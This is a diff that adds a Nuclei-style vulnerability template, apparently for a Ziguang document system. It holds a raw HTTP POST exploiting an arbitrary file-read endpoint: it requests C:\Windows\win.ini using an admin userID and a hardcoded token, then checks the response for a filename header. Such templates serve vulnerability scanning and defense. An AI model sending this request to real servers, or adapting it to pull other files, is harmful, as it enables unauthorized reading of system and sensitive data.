@@ -1,0 +1,43 @@
+
+id: ziguang-remoteupload-fileread
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+variables:
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /Using/Subject/downLoad.html?path=C:\Windows\win.ini HTTP/1.1
+        Connection: close
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="userID"
+
+        admin
+        ------{{boundary}}
+        Content-Disposition: form-data; name="fondsid"
+
+        1
+        ------{{boundary}}
+        Content-Disposition: form-data; name="comid"
+
+        1
+        ------{{boundary}}
+        Content-Disposition: form-data; name="token"
+
+        5117e82385cef4c12547fdd4c028b97a1-1
+        ------{{boundary}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(all_headers,"filename=")
